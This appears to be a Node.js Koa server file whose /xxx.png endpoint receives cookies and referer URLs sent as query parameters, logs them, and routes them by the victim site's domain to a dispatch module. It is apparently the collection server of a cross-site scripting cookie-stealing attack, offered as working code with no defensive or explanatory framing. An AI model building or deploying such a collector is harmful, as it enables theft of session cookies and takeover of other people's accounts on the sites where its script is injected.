var koa = require('koa');
var router = require('koa-router');
var app = koa();
var debug = require('debug')('cookie');
var logger = require('koa-logger');
var dispatch = require('./lib/dispatch');
var URL = require('url');
var tld = require('tldjs');

app.use(logger());
app.use(router(app));

app.get('/xxx.png', function *() {
  var result = {};

  var query = this.request.query;
  result.cookies = query.c;
  result.referer = query.referer || this.request.header.referer;

  debug(result);

  this.body = 'done';

  var host = URL.parse(result.referer).host;

  var domain = tld.getDomain(host);
  if (domain) {
    debug('domain = ', domain)
    process.nextTick(function () {
      dispatch(domain, result);
    });
  } else {
    debug('domain not found');
  }
});

app.listen(3000);